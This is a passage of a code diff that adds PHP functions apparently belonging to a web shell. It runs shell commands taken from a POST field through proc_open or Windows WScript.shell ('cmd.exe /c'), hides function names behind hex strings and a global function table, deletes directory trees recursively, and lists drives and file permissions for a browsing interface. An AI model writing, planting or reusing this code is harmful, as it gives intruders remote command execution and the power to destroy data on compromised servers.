+        } elseif (function_exists("\x70\x72\x6f\x63\x5f\x6f\x70\x65\x6e")) {
+            $pipes = array();
+            $process = @$GLOBALS['fungsi'][23]($in . ' 2>&1', array(array("pipe", "w"), array("pipe", "w"), array("pipe", "w")), $pipes, null);
+            $out = @$GLOBALS['fungsi'][22]($pipes[1]);
+        } elseif (class_exists('COM')) {
+            $alfaWs = new COM('WScript.shell');
+            $exec = $alfaWs->$GLOBALS['fungsi'][16]('cmd.exe /c ' . $_POST['alfa1']);
+            $stdout = $exec->StdOut();
+            $out = $stdout->ReadAll();
+        }
+    } catch (Exception $e) {
+    }
+    return $out;
+}
+
+
+function winpwd()
+{
+    return str_replace("\\", "/", $GLOBALS['fungsi'][0]());
+}
+
+function remove_slash($val)
+{
+    $tex = str_replace("/", "", $val);
+    $tex1 = str_replace(":", "", $tex);
+    $tex2 = str_replace("_", "", $tex1);
+    $tex3 = str_replace(" ", "", $tex2);
+    $tex4 = str_replace(".", "", $tex3);
+    return $tex4;
+}
+
+function getc()
+{
+    $p = getenv('MIBDIRS');
+    $read = explode(":", $p);
+    return $read[0];
+}
+
+
+function check_xampp()
+{
+    $mysql = getenv('MYSQL_HOME');
+    if (strstr($mysql, "xampp")) {
+        return True;
+    } else {
+        return False;
+    }
+}
+
+function unlinkDir($dir)
+{
+    $dirs = array($dir);
+    $files = array();
+    for ($i = 0;; $i++) {
+        if (isset($dirs[$i]))
+            $dir =  $dirs[$i];
+        else
+            break;
+
+        if ($openDir = opendir($dir)) {
+            while ($readDir = @readdir($openDir)) {
+                if ($readDir != "." && $readDir != "..") {
+
+                    if ($GLOBALS['fungsi'][2]($dir . "/" . $readDir)) {
+                        $dirs[] = $dir . "/" . $readDir;
+                    } else {
+
+                        $files[] = $dir . "/" . $readDir;
+                    }
+                }
+            }
+        }
+    }
+
+
+
+    foreach ($files as $file) {
+        $GLOBALS['fungsi'][24]($file);
+    }
+    $dirs = array_reverse($dirs);
+    foreach ($dirs as $dir) {
+        $GLOBALS['fungsi'][25]($dir);
+    }
+}
+
+function remove_dot($file)
+{
+    $FILES = $file;
+    $pch = explode(".", $FILES);
+    return $pch[0];
+}
+
+
+function windowsDriver()
+{
+    $winArr = [
+        'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'V', 'W', 'X', 'Y', 'Z'
+    ];
+    foreach ($winArr as $winNum => $winVal) {
+        if (is_dir($winVal . ":/")) {
+            echo "<a style='color:orange; font-weight:bold;' href='?d=" . hx($winVal . ":/") . "'>[ " . $winVal . " ]</a>&nbsp;";
+        }
+    }
+}
+
+function namaPanjang($value)
+{
+    $namaNya = $value;
+    $extensi = pathinfo($value, PATHINFO_EXTENSION);
+    if (strlen($namaNya) > 30) {
+        return substr($namaNya, 0, 30) . "...";
+    } else {
+        return $value;
+    }
+}
+
+function perms($file)
+{
+    $perms = $GLOBALS['fungsi'][6]($file);
+    if (($perms & 0xC000) == 0xC000) {
+        // Socket
+        $info = 's';
+    } elseif (($perms & 0xA000) == 0xA000) {
+        // Symbolic Link
+        $info = 'l';
+    } elseif (($perms & 0x8000) == 0x8000) {
+        // Regular
+        $info = '-';
+    } elseif (($perms & 0x6000) == 0x6000) {
+        // Block special
+        $info = 'b';
+    } elseif (($perms & 0x4000) == 0x4000) {
+        // Directory
+        $info = 'd';
+    } elseif (($perms & 0x2000) == 0x2000) {
+        // Character special
+        $info = 'c';
+    } elseif (($perms & 0x1000) == 0x1000) {
+        // FIFO pipe
+        $info = 'p';
+    } else {
+        // Unknown
+        $info = 'u';
+    }
+    // Owner
+    $info .= (($perms & 0x0100) ? 'r' : '-');
+    $info .= (($perms & 0x0080) ? 'w' : '-');
+    $info .= (($perms & 0x0040) ?
+        (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));
+    // Group
+    $info .= (($perms & 0x0020) ? 'r' : '-');
+    $info .= (($perms & 0x0010) ? 'w' : '-');
+    $info .= (($perms & 0x0008) ?
+        (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));
+
+    // World
+    $info .= (($perms & 0x0004) ? 'r' : '-');
+    $info .= (($perms & 0x0002) ? 'w' : '-');
+    $info .= (($perms & 0x0001) ?
+        (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));
+    return $info;
+}
+?>
